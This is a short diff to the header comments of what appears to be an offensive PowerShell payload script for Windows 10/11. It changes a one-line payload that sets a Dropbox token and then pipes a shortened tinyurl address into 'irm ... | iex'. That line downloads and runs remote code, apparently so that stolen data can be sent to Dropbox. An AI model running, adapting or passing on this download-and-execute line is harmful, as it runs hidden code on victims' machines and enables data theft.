@@ -20,7 +20,7 @@
 # Target: Windows 10/11
 # Version: 2.0
 # How-To: update $db = 'INSERT-YOUR-DROPBOX-TOKEN' then run the payload in powershell
-# payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/488cxscc | iex
+# payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/3tm7msr7 | iex
 # 
 #------------------------------------------------------------------------------------------------------------------------------------
 #
